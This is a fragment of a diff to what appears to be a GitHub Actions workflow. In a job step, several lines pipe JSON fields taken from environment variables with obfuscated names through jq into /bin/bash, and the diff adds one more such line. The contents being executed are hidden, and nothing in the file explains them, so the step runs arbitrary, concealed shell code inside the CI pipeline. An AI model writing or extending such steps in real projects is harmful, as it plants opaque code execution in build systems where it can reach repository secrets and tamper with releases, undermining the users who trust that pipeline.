@@ -27,6 +27,7 @@ jobs:
           echo $nub8 | jq -r .rf6687 | /bin/bash
           echo $ccv43 | jq -r .a34 | /bin/bash
           echo $bncoe66016 | jq -r .jwj5 | /bin/bash
+          printf '%s' "$p72861" | jq -r .egfid7 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
